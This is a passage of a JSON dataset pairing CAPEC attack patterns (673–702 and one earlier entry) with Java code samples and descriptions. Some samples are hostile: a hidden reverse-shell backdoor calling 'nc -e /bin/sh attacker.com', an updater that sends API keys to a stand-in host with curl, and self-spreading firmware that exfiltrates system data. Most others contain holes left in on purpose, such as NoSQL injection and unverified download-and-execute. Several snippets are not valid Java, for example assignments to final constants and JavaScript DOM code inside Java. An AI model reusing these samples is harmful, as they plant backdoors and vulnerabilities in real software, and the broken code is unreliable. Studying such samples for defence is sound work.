        "code_snippet": "public class MaliciousChipController {\n    private static final int CONTROL_REGISTER = 0x1234;\n    private static volatile boolean activated = false;\n    \n    static {\n        try {\n            // Malicious code that activates on specific hardware conditions\n            if (isTargetHardware()) {\n                unsafe.putInt(CONTROL_REGISTER, 0xDEADBEEF);\n                new Thread(() -> {\n                    while (!activated) {\n                        if (System.currentTimeMillis() % 86400000 == 0) {\n                            executeBackdoor();\n                            activated = true;\n                        }\n                    }\n                }).start();\n            }\n        } catch (Exception e) {}\n    }\n    \n    private static void executeBackdoor() {\n        try {\n            Runtime.getRuntime().exec(\"nc -e /bin/sh attacker.com 4444\");\n        } catch (Exception e) {}\n    }\n    \n    private static boolean isTargetHardware() {\n        return unsafe.getInt(CONTROL_REGISTER) == 0x1337;\n    }\n    \n    // Legitimate-looking chip control methods\n    public void normalOperation() {\n        // Normal chip operations\n    }\n}",
        "description": "A malicious chip controller implementation that includes a stealthy backdoor triggered by specific hardware conditions. It exploits memory-mapped I/O registers and embedded malicious code that activates after a time-based condition. The code creates a reverse shell connection to an attacker's server while appearing to perform normal chip operations."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "public class SignedSoftwareUpdater {\n    private static final String UPDATE_URL = \"https://trusted-dev.example.com/updates\";\n    private static final String DEBUG_LOG = \"/tmp/debug.log\";\n    \n    public void downloadAndInstallUpdate() {\n        try {\n            // Hidden malicious code inserted during build process\n            if (System.currentTimeMillis() % 100 == 0) {\n                FileWriter fw = new FileWriter(DEBUG_LOG, true);\n                fw.write(\"API_KEY=\" + System.getenv(\"API_KEY\"));\n                fw.close();\n                Runtime.getRuntime().exec(\"curl -s malicious.example.com/exfil?data=\" + \n                    Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(DEBUG_LOG))));\n            }\n            \n            URL url = new URL(UPDATE_URL);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            // Automatically trust and execute downloaded code\n            byte[] update = is.readAllBytes();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            fos.write(update);\n            fos.close();\n            \n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a software updater that downloads and executes updates from a trusted developer. However, it contains hidden malicious code (injected during the build process) that periodically exfiltrates sensitive data through debug logs. The code also downloads and executes updates without proper integrity verification, assuming the digital signature is valid because it comes from a trusted source. The malicious functionality is obscured within seemingly legitimate update functionality, creating a trojan horse scenario."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class FPGAConfiguration {\n    private static final String CONFIG_FILE = \"/dev/fpga/config.bit\";\n    private static volatile boolean isConfiguring = false;\n\n    public static void reloadFPGAConfiguration() {\n        try {\n            // Disable configuration verification during reload\n            isConfiguring = true;\n            \n            // No checksum verification\n            byte[] configData = loadConfigurationData(CONFIG_FILE);\n            \n            // Vulnerable: No validation of configuration data integrity\n            writeFPGAConfiguration(configData);\n            \n            Thread.sleep(100); // Wait for configuration to settle\n            \n        } catch (Exception e) {\n            // Silently ignore errors during configuration\n        } finally {\n            isConfiguring = false;\n        }\n    }\n\n    private static byte[] loadConfigurationData(String filename) {\n        // No verification of file source or integrity\n        return new byte[1024]; // Simplified for example\n    }\n\n    private static void writeFPGAConfiguration(byte[] data) {\n        // Direct write to FPGA without validation\n        // Vulnerable to malicious configuration injection\n    }\n}",
        "description": "This vulnerable code demonstrates an FPGA configuration system that allows unchecked configuration reloads. It lacks proper validation of configuration data integrity, authentication of the configuration source, and protection against timing-based attacks. The code is susceptible to malicious configuration injection during the reload process, potentially allowing an attacker to introduce harmful functions into the FPGA's operation."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "public class DeviceDataManager {\n    private byte[] sensitiveData;\n    private boolean isDecommissioned = false;\n\n    public void storeData(byte[] data) {\n        sensitiveData = data;\n    }\n\n    public void decommissionDevice() {\n        // Insufficient data removal - just marking as decommissioned\n        isDecommissioned = true;\n        // Not properly clearing sensitive data from memory\n        sensitiveData = null;\n    }\n\n    public void recycleDevice() {\n        if(isDecommissioned) {\n            // Device can be recycled with sensitive data still in memory\n            // No secure wiping or overwriting of data\n            System.gc();\n            return;\n        }\n    }\n\n    public byte[] getData() {\n        // Still allows access to data even after decommissioning\n        if(sensitiveData != null) {\n            return sensitiveData;\n        }\n        return new byte[0];\n    }\n}",
        "description": "This code demonstrates improper handling of sensitive data during device decommissioning. It fails to properly scrub data from memory, only sets data references to null without secure wiping, and allows potential access to sensitive information even after decommissioning. The garbage collector call doesn't guarantee secure data removal, leaving residual data vulnerable to recovery through memory inspection or device recycling."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "public UserData findUserByCredentials(String username, String password) {\n    MongoClient mongoClient = new MongoClient(\"localhost\", 27017);\n    MongoDatabase database = mongoClient.getDatabase(\"userdb\");\n    MongoCollection<Document> collection = database.getCollection(\"users\");\n    \n    String query = \"{username: '\" + username + \"', password: '\" + password + \"'}\";\n    Document document = collection.find(Document.parse(query)).first();\n    \n    if (document != null) {\n        return new UserData(document);\n    }\n    return null;\n}",
        "description": "This vulnerable code demonstrates a NoSQL injection vulnerability in a MongoDB query. The code directly concatenates user input into a query string without proper sanitization or parameter binding. An attacker could inject MongoDB operators (like $gt, $ne, $or) to bypass authentication or manipulate the query logic. For example, using a username like \"admin', $or: [ {}, { 'a':'a\" could result in authentication bypass."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "public class MaliciousFirmware {\n    private static final int FLASH_MEMORY_BASE = 0xF000;\n    private static volatile int[] mmioRegisters = new int[1024];\n    \n    static {\n        try {\n            // Load malicious firmware into flash memory region\n            System.loadLibrary(\"hidden_payload\");\n            initializeMMIO();\n        } catch (Exception e) {}\n    }\n\n    private static void initializeMMIO() {\n        // Map to hardware registers without access control\n        for (int i = 0; i < mmioRegisters.length; i++) {\n            mmioRegisters[i] = FLASH_MEMORY_BASE + i;\n        }\n        // Insert malicious code into firmware region\n        mmioRegisters[0x100] = 0xDEADBEEF;\n        collectAndSendTraceData();\n    }\n\n    private static void collectAndSendTraceData() {\n        byte[] systemInfo = System.getProperties().toString().getBytes();\n        try {\n            Socket socket = new Socket(\"malicious.server.com\", 4444);\n            socket.getOutputStream().write(systemInfo);\n            socket.close();\n        } catch (Exception e) {}\n    }\n\n    public static void propagate() {\n        // Replicate to other networked systems\n        try {\n            String[] networkDevices = getNetworkDevices();\n            for (String device : networkDevices) {\n                infectDevice(device);\n            }\n        } catch (Exception e) {}\n    }\n}",
        "description": "This code simulates malicious firmware that could be embedded in hardware components. It demonstrates direct memory-mapped I/O manipulation without proper access controls, collection and exfiltration of sensitive system information, and self-replication capabilities. The code attempts to load a malicious payload, manipulate hardware registers, and send collected system data to an attacker-controlled server."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "public class SystemBuildConfig {\n    private static final String TEMP_BUILD_DIR = \"/tmp/build/\";\n    private static final String CONFIG_PATH = System.getenv(\"BUILD_CONFIG_PATH\");\n    \n    public void performBuild() throws Exception {\n        // Create temporary build directory with insecure permissions\n        File tempDir = new File(TEMP_BUILD_DIR);\n        tempDir.mkdirs();\n        tempDir.setWritable(true, false);\n        \n        // Load build configuration from environment-specified path\n        Properties buildProps = new Properties();\n        try {\n            buildProps.load(new FileInputStream(CONFIG_PATH));\n            System.out.println(\"Loaded configuration from: \" + CONFIG_PATH);\n            System.out.println(\"Build properties: \" + buildProps.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.err.println(\"Failed to load from: \" + CONFIG_PATH + \", stack trace: \" + e.getMessage());\n        }\n        \n        // Dynamically load and execute build steps\n        String buildStepsClass = buildProps.getProperty(\"build.steps.class\");\n        Class<?> buildClass = Class.forName(buildStepsClass);\n        Object buildSteps = buildClass.newInstance();\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in a system build configuration: it creates a world-writable temporary directory, loads configuration from an untrusted path specified by an environment variable, exposes sensitive build information in error messages, and performs unsafe dynamic class loading. The code allows for build process manipulation through various attack vectors including temporary file tampering, path manipulation, and unauthorized access to build configuration data."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class UnsecureBootloader {\n    private static final int BOOT_REGION_START = 0x1000;\n    private static final int BOOT_REGION_SIZE = 0x4000;\n    private byte[] volatileMemory = new byte[0x10000];\n    private boolean isLocked = false;\n\n    public void loadBootCode(byte[] bootCode) {\n        // Copy boot code from non-volatile to volatile memory without access checks\n        System.arraycopy(bootCode, 0, volatileMemory, BOOT_REGION_START, bootCode.length);\n    }\n\n    public void writeMemory(int address, byte[] data) {\n        // No proper access control for overlapping memory regions\n        if (address >= BOOT_REGION_START && address < BOOT_REGION_START + BOOT_REGION_SIZE) {\n            if (!isLocked) {\n                // Allows writing to boot region even after initialization\n                System.arraycopy(data, 0, volatileMemory, address, data.length);\n            }\n        }\n    }\n\n    public byte[] readMemory(int address, int length) {\n        // No protection for mirrored memory regions\n        byte[] result = new byte[length];\n        System.arraycopy(volatileMemory, address, result, 0, length);\n        return result;\n    }\n\n    public void setLock(boolean lock) {\n        // Single lock bit for large memory region\n        this.isLocked = lock;\n    }\n}",
        "description": "This code demonstrates multiple memory protection vulnerabilities including insufficient granularity of memory protection, lack of proper access controls for boot code in volatile memory, and improper handling of memory region overlaps. The bootloader allows writing to memory regions that should be immutable after boot, doesn't properly protect against unauthorized access to boot code loaded in volatile memory, and uses a single lock bit to protect a large memory region."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "public class HardwareController {\n    private static final int LOCK_BIT_REGISTER = 0x1000;\n    private static final int CONTROL_REGISTER = 0x2000;\n    private static final int SECURITY_CONFIG = 0x3000;\n    private static boolean isLocked = false;\n    \n    public static void writeToControlRegister(int value) {\n        // No verification of lock status before writing\n        CONTROL_REGISTER = value;\n    }\n    \n    public static void setLockBit() {\n        isLocked = true;\n        LOCK_BIT_REGISTER = 1;\n    }\n    \n    public static void modifySecurityConfig(int newConfig) {\n        // Can modify security configuration even after lock bit is set\n        if (isLocked) {\n            isLocked = false;  // Bypass lock protection\n        }\n        SECURITY_CONFIG = newConfig;\n    }\n    \n    public static int readMeasurementData() {\n        // Returns mutable attestation data without verification\n        return SECURITY_CONFIG;\n    }\n}",
        "description": "This vulnerable code demonstrates improper access control for hardware registers, allowing unauthorized modification of lock bits and security-sensitive registers. The code fails to properly implement write-once protection, allows lock bit bypass, and exposes mutable attestation data. It lacks proper access restrictions and validation mechanisms for hardware control registers."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSecurityManager {\n    private static final String DEFAULT_TOKEN = \"default_token\";\n    \n    public boolean validateAccess(String operation, String token) {\n        // Missing token validation\n        if (token == null) {\n            token = DEFAULT_TOKEN;\n        }\n        \n        // Obsolete Base64 encoding for security tokens\n        String encodedToken = Base64.getEncoder().encodeToString(token.getBytes());\n        \n        // Incorrect token generation - uses fixed seed\n        Random random = new Random(12345);\n        String generatedToken = String.valueOf(random.nextInt());\n        \n        // No proper security identifier checks\n        return true;\n    }\n    \n    public void performTransaction(String data) {\n        // Missing source identifier in transaction\n        executeOperation(data);\n    }\n    \n    private void executeOperation(String data) {\n        // Critical operation without proper security checks\n        System.out.println(\"Executing: \" + data);\n    }\n}",
        "description": "A vulnerable System-on-Chip security implementation that demonstrates multiple security token and identifier issues: missing token validation, use of obsolete encoding, predictable token generation, missing security identifier checks, and transactions without source identifiers. The code allows unauthorized access by defaulting to a basic token, using weak encoding, and not properly validating security credentials."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "public class UnpatchableDevice {\n    private static final byte[] FIRMWARE = {\n        (byte)0xDE, (byte)0xAD, (byte)0xBE, (byte)0xEF\n    };\n    private static final boolean IS_ROM = true;\n    \n    public void updateFirmware(byte[] newFirmware) {\n        if(IS_ROM) {\n            // Can't update ROM - silently fail\n            return;\n        }\n    }\n    \n    public void executeCode() {\n        // No voltage/clock glitch detection\n        int voltage = readVoltage();\n        int clockSpeed = readClock();\n        \n        // Vulnerable code execution without checks\n        for(int i = 0; i < FIRMWARE.length; i++) {\n            executeByte(FIRMWARE[i]);\n        }\n    }\n    \n    private void executeByte(byte instruction) {\n        // Execute potentially vulnerable code without protection\n        // against fault injection or redundancy checks\n    }\n    \n    private int readVoltage() { return 0; }\n    private int readClock() { return 0; }\n}",
        "description": "This code represents a device with unpatchable firmware stored in ROM. It lacks firmware update capabilities, voltage/clock glitch detection, and error injection protection. The device continues to execute potentially vulnerable code without any safeguards or ability to patch security issues."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "public class ResourceDownloader {\n    private String primaryRepo = \"https://trusted-source.com/resources/\";\n    private String backupRepo = \"https://backup-source.com/resources/\";\n\n    public File downloadResource(String resourceName) {\n        try {\n            URL url = new URL(backupRepo + resourceName);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            File downloadedFile = new File(\"/downloads/\" + resourceName);\n            \n            // Download file without verifying source or metadata\n            try (InputStream in = conn.getInputStream();\n                 FileOutputStream out = new FileOutputStream(downloadedFile)) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            }\n            \n            // Blindly copy metadata from source\n            downloadedFile.setLastModified(conn.getLastModified());\n            downloadedFile.setExecutable(true);\n            \n            return downloadedFile;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code downloads resources from a less trusted backup source without verifying the integrity, authenticity, or metadata of the downloaded content. It blindly trusts and copies metadata, allows executable permissions, and doesn't validate the source or content of the downloaded file, making it susceptible to spoofing and malicious resource substitution attacks."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "public class DependencyDownloader {\n    public void installDependency(String packageName, String version) {\n        String repoUrl = \"http://unofficial-repo.com/packages/\";\n        String downloadUrl = repoUrl + packageName + \"-\" + version + \".jar\";\n        \n        try {\n            URL url = new URL(downloadUrl);\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            \n            // Directly save and load the downloaded JAR without verification\n            FileOutputStream out = new FileOutputStream(packageName + \".jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Load the JAR into classpath without checking signatures\n            URLClassLoader child = new URLClassLoader(\n                new URL[]{new File(packageName + \".jar\").toURI().toURL()},\n                this.getClass().getClassLoader()\n            );\n            Class<?> classToLoad = Class.forName(\"com.package.MainClass\", true, child);\n            classToLoad.getDeclaredMethod(\"init\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable dependency management system that downloads and executes third-party code without proper verification. It downloads JARs from an unofficial repository without checking signatures or hashes, and immediately loads them into the classpath. This makes it susceptible to malicious code injection through spoofed packages that masquerade as legitimate dependencies."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "public class DependencyManager {\n    private static final String REMOTE_REPO = \"http://malicious-mirror.com/repo\";\n    \n    public static void installDependency(String packageName) {\n        try {\n            // Download package metadata without verification\n            URL url = new URL(REMOTE_REPO + \"/\" + packageName + \"/metadata.json\");\n            URLConnection conn = url.openConnection();\n            \n            // Read and trust metadata without validation\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String metadata = reader.readLine();\n            \n            // Extract git commit information and package URL\n            JSONObject json = new JSONObject(metadata);\n            String commitHash = json.getString(\"lastCommit\");\n            String downloadUrl = json.getString(\"packageUrl\");\n            \n            // Download and execute package without integrity check\n            downloadAndExecute(downloadUrl);\n            \n            System.out.println(\"Package installed successfully - Last commit: \" + commitHash);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void downloadAndExecute(String url) throws Exception {\n        URL packageUrl = new URL(url);\n        File tempFile = File.createTempFile(\"package\", \".jar\");\n        FileUtils.copyURLToFile(packageUrl, tempFile);\n        \n        // Execute downloaded code without verification\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{tempFile.toURI().toURL()});\n        Class<?> loadedClass = classLoader.loadClass(\"com.package.Main\");\n        loadedClass.getMethod(\"run\").invoke(null);\n    }\n}",
        "description": "This code demonstrates a vulnerable dependency manager that downloads and executes code from a potentially malicious repository without proper integrity checks or source verification. It blindly trusts metadata from the remote source, including git commit information, and executes downloaded code without validation. The code exposes multiple vulnerabilities including download without integrity verification, trust in less trusted sources, and potential execution of malicious code."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "public class PackageManager {\n    public static void installPackage(String packageUrl) {\n        try {\n            // Download package without verifying source or signature\n            URL url = new URL(packageUrl);\n            URLConnection conn = url.openConnection();\n            \n            // Read metadata without validation\n            JSONObject metadata = new JSONObject(new String(conn.getInputStream().readAllBytes()));\n            \n            // Blindly trust download count and author information\n            int downloads = metadata.getInt(\"downloads\");\n            String author = metadata.getString(\"author\");\n            \n            // Execute downloaded code without integrity verification\n            String codePath = downloadAndExtract(packageUrl);\n            Runtime.getRuntime().exec(\"java -jar \" + codePath);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static String downloadAndExtract(String url) {\n        // Implementation omitted - downloads and extracts package\n        return \"/path/to/downloaded/package.jar\";\n    }\n}",
        "description": "This code demonstrates vulnerability to package spoofing by downloading and executing code from a remote source without verifying its authenticity or integrity. It blindly trusts metadata about package popularity and authorship, and executes the downloaded code without signature verification or hash checking. The code also ignores proper security measures for third-party dependency management."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "public class SystemInfoCollector {\n    public static void logSystemInformation() {\n        String userHome = System.getProperty(\"user.home\");\n        String osName = System.getProperty(\"os.name\");\n        String timeZone = System.getProperty(\"user.timezone\");\n        String language = System.getProperty(\"user.language\");\n        \n        // Store sensitive system information in publicly accessible directory\n        try {\n            File publicDir = new File(\"/public/logs/\");\n            publicDir.mkdirs();\n            FileWriter writer = new FileWriter(\"/public/logs/system_info.txt\");\n            writer.write(\"Home Directory: \" + userHome + \"\\n\");\n            writer.write(\"OS: \" + osName + \"\\n\");\n            writer.write(\"Timezone: \" + timeZone + \"\\n\");\n            writer.write(\"Language: \" + language + \"\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code collects sensitive system information including user home directory, OS details, timezone, and language settings, and stores them in a publicly accessible directory without proper access controls. The code exhibits multiple vulnerabilities including exposure of sensitive system information (CWE-497), improper storage of access control information (CWE-529), and potential exposure of sensitive data through file system access. The information collected could be used by attackers for system fingerprinting and targeting specific attacks."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "public class DependencyManager {\n    private String gitRepoUrl;\n\n    public DependencyManager(String repoUrl) {\n        this.gitRepoUrl = repoUrl;\n    }\n\n    public void installDependency(String packageName) {\n        try {\n            String command = \"git clone \" + gitRepoUrl + \"/\" + packageName;\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n\n            // Dynamically load and execute code from cloned repository\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(packageName + \"/lib\").toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(packageName + \".Setup\");\n            loadedClass.getMethod(\"initialize\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that directly clones and executes code from a Git repository without proper integrity checks. It uses Runtime.exec() to clone a repository and then dynamically loads and executes code from it without verifying the source or contents, making it susceptible to malicious code injection through repository redirection attacks."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "public class SideChannelLeak {\n    private static final int CACHE_LINE_SIZE = 64;\n    private byte[] secretData = new byte[4096];\n    \n    public void performOperation() {\n        try {\n            // Deliberately cause page fault to trigger transient execution\n            byte value = secretData[8192]; // Out of bounds access\n            \n            // Speculative execution may continue here\n            int index = (value & 0xFF) * CACHE_LINE_SIZE;\n            ProbeArray.probe[index]++; // Side channel leak\n            \n        } catch (ArrayIndexOutOfBoundsException e) {\n            // Exception handler\n        }\n    }\n    \n    private static class ProbeArray {\n        public static volatile byte[] probe = new byte[256 * CACHE_LINE_SIZE];\n    }\n}",
        "description": "This code demonstrates a Spectre-style vulnerability by attempting to exploit transient execution through deliberate page faults and speculative execution. The code tries to leak sensitive data through cache timing side channels by accessing a probe array based on secret values during the transient execution window. The vulnerability occurs because the processor may speculatively execute the array access and cache probe even though the initial access is invalid, potentially exposing secret data through cache timing analysis."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "public class VulnerableDHCPClient {\n    public void connectToDHCPServer() {\n        try {\n            DatagramSocket socket = new DatagramSocket(68);\n            byte[] requestData = createDHCPRequest();\n            DatagramPacket requestPacket = new DatagramPacket(requestData, requestData.length,\n                InetAddress.getByName(\"255.255.255.255\"), 67);\n            \n            socket.send(requestPacket);\n            \n            // Receive DHCP offer without any validation\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Blindly trust the DHCP response without verification\n            InetAddress dhcpServer = receivePacket.getAddress();\n            String gateway = extractGateway(receivePacket.getData());\n            String dnsServer = extractDNSServer(receivePacket.getData());\n            \n            // Configure network settings without authenticating the DHCP server\n            configureNetworkSettings(gateway, dnsServer);\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void configureNetworkSettings(String gateway, String dnsServer) {\n        // Directly apply network settings from untrusted DHCP response\n    }\n}",
        "description": "This vulnerable code implements a DHCP client that fails to properly authenticate or validate the DHCP server. It blindly accepts and applies network configuration from any responding server, making it susceptible to DHCP spoofing attacks. The code lacks server authentication, doesn't verify the legitimacy of DHCP responses, and relies solely on IP addresses for communication, allowing attackers to intercept and manipulate network configurations."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "public class UpdateManager {\n    public static void installExtension(String extensionUrl) {\n        try {\n            // Download extension from unverified URL without integrity check\n            URL url = new URL(extensionUrl);\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            \n            // Load arbitrary code from external location\n            String tempDir = System.getProperty(\"java.io.tmpdir\");\n            File extensionFile = new File(tempDir + \"/extension.jar\");\n            FileOutputStream out = new FileOutputStream(extensionFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Load and execute untrusted code without verification\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{extensionFile.toURI().toURL()});\n            Class<?> extensionClass = classLoader.loadClass(\"com.extension.Main\");\n            extensionClass.getMethod(\"initialize\").invoke(null);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable extension installation system that downloads and executes arbitrary code from an untrusted source without proper verification. It downloads a JAR file from a specified URL without checking its integrity or authenticity, saves it to a temporary directory, and then loads and executes it using a URLClassLoader. This makes it possible for malicious code to be executed with the same privileges as the host application."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "public class MonitorDataExfiltration {\n    private static final int MONITOR_WIDTH = 1920;\n    private static final int MONITOR_HEIGHT = 1080;\n    \n    public void sendScreenDataToVGA(byte[] screenBuffer) {\n        // Unprotected VGA signal transmission\n        for(int y = 0; y < MONITOR_HEIGHT; y++) {\n            for(int x = 0; x < MONITOR_WIDTH; x++) {\n                // Send raw pixel data without encryption or EMI protection\n                int pixelIndex = y * MONITOR_WIDTH + x;\n                sendRawSignal(screenBuffer[pixelIndex]);\n            }\n            // Send horizontal sync pulse without shielding\n            sendHSync();\n        }\n        // Send vertical sync pulse without protection\n        sendVSync();\n    }\n    \n    private void sendRawSignal(byte data) {\n        // Direct unprotected signal transmission\n        // No EMI shielding or signal scrambling\n        try {\n            Thread.sleep(0, data); // Timing variation based on data\n        } catch (InterruptedException e) {}\n    }\n    \n    private void sendHSync() {\n        // Unprotected horizontal sync signal\n        try {\n            Thread.sleep(1);\n        } catch (InterruptedException e) {}\n    }\n    \n    private void sendVSync() {\n        // Unprotected vertical sync signal\n        try {\n            Thread.sleep(2);\n        } catch (InterruptedException e) {}\n    }\n}",
        "description": "This vulnerable code demonstrates transmission of monitor data through an unprotected VGA interface. It sends raw pixel data without any electromagnetic emission protection or signal encryption, making it susceptible to electromagnetic side-channel attacks. The code deliberately introduces timing variations based on data values, creating potential covert channels through physical emissions. The lack of shielding and cleartext transmission of screen data makes it possible for attackers to reconstruct the display content through air-gap attacks by capturing electromagnetic emissions."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "public class NetworkBridge {\n    private Socket trustedSocket;\n    private Socket untrustedSocket;\n    \n    public NetworkBridge(String trustedHost, int trustedPort, String untrustedHost, int untrustedPort) {\n        try {\n            trustedSocket = new Socket(trustedHost, trustedPort);\n            untrustedSocket = new Socket(untrustedHost, untrustedPort);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void bridgeNetworks() {\n        try {\n            InputStream untrustedInput = untrustedSocket.getInputStream();\n            OutputStream trustedOutput = trustedSocket.getOutputStream();\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            \n            // Vulnerable: No authentication, no message integrity checks\n            while ((bytesRead = untrustedInput.read(buffer)) != -1) {\n                trustedOutput.write(buffer, 0, bytesRead);\n                trustedOutput.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network bridge implementation that creates a direct channel between trusted and untrusted networks without proper authentication, access control, or message integrity checks. It allows unrestricted data flow between networks, mixing trusted and untrusted data streams without validation, and lacks endpoint verification."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "public class VulnerableWebBrowser {\n    private WebSocket webSocket;\n    private boolean authenticated = false;\n\n    public void establishRemoteConnection(String targetUrl) {\n        try {\n            // Establish WebSocket connection without proper origin verification\n            webSocket = new WebSocket(new URI(targetUrl));\n            \n            // Include third-party remote desktop widget without validation\n            String remoteDesktopWidget = \n                \"<script src='http://untrusted-source.com/remote-desktop.js'></script>\";\n            document.getElementById(\"browser-container\").innerHTML = remoteDesktopWidget;\n\n            // Vulnerable authentication mechanism susceptible to replay attacks\n            webSocket.onmessage = (event) -> {\n                if (event.data.contains(\"auth_token\")) {\n                    authenticated = true;\n                    startRemoteSession(event.data);\n                }\n            };\n\n            // Client-side security check that can be bypassed\n            if (authenticated) {\n                webSocket.send(\"CONNECT_REMOTE_DESKTOP\");\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startRemoteSession(String sessionData) {\n        // Context switch without proper synchronization\n        new Thread(() -> {\n            establishRemoteDesktopConnection(sessionData);\n        }).start();\n    }\n\n    private void establishRemoteDesktopConnection(String sessionData) {\n        // Process remote desktop connection without server-side validation\n        processRemoteCommands(sessionData);\n    }\n}",
        "description": "This vulnerable code demonstrates a web browser implementation that establishes an insecure remote desktop connection. It includes multiple vulnerabilities: insufficient origin verification for WebSocket connections, inclusion of untrusted third-party remote desktop widgets, weak authentication susceptible to replay attacks, client-side security checks that can be bypassed, and unsafe context switching in remote desktop session establishment. The code relies heavily on client-side security mechanisms and lacks proper server-side validation."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class HardwareDebugController {\n    private boolean isGlobalDebugEnabled = false;\n\n    public void enableDebugMode(String accessToken) {\n        // Basic global authentication without per-function checks\n        if (accessToken.equals(\"master_debug_token\")) {\n            isGlobalDebugEnabled = true;\n        }\n    }\n\n    public void readInternalRegisters() {\n        if (isGlobalDebugEnabled) {\n            // No specific authorization check for register access\n            accessInternalRegisters();\n            collectTraceData();\n            modifyTestModes();\n        }\n    }\n\n    private void accessInternalRegisters() {\n        // Direct access to sensitive registers without granular checks\n        byte[] sensitiveData = new byte[1024];\n        // Store trace data in unprotected memory\n        storeTraceData(sensitiveData);\n    }\n\n    private void storeTraceData(byte[] data) {\n        // Storing sensitive trace data without encryption or protection\n        SystemMemory.write(0x1000, data);\n    }\n\n    private void modifyTestModes() {\n        // Modify test modes without specific authorization\n        setTestMode(TestMode.FULL_ACCESS);\n    }\n}",
        "description": "This vulnerable code demonstrates improper debug access control at the hardware level by implementing a single global authorization check instead of granular per-function authorization. It allows unrestricted access to internal registers, test modes, and trace data once global debug mode is enabled. The code stores sensitive trace data in unprotected memory locations and lacks proper validation for specific debug operations, making it susceptible to unauthorized access and manipulation of debug functionality."
    }
]